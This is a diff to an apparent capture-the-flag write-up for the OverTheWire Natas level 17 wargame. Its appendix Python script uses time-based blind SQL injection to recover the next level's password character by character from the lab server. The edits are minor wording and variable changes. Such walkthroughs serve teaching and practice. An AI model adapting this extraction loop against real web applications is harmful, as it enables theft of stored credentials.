@@ -93,7 +93,7 @@ And this is the password.
 
 ## Appendix
 
-The following code sums it all up. Run it and enjoy:
+The following code sums it all up. Copy it into a Python file and run it. Enjoy:
 
 ```python
 from requests import get
@@ -117,7 +117,6 @@ URL = "http://natas17.natas.labs.overthewire.org/?username={}"
 AUTH = HTTPBasicAuth(natas17_username, natas17_password)
 
 # Recover relevant characters
-print("Discovering the characters appearing in the password:")
 for c in digits + ascii_letters:
     res = get(url=URL.format(sql_injection_recover_charecters.format(c)), auth=AUTH)
 
@@ -126,10 +125,9 @@ for c in digits + ascii_letters:
         print("The password contains the following characters: " + ",".join(characters_in_use))
 
 # Revover the password
-print("Revealing the password:")
 for _ in range(password_length):
     for c in characters_in_use:
-        res = get(url=URL.format(sql_injection_time_based.format(natas18_password+c)), auth=AUTH)
+        res = get(url=URL.format(sql_injection_recover_password.format(natas18_password+c)), auth=AUTH)
         
         if(res.elapsed.seconds >= waiting_time):
             natas18_password += c
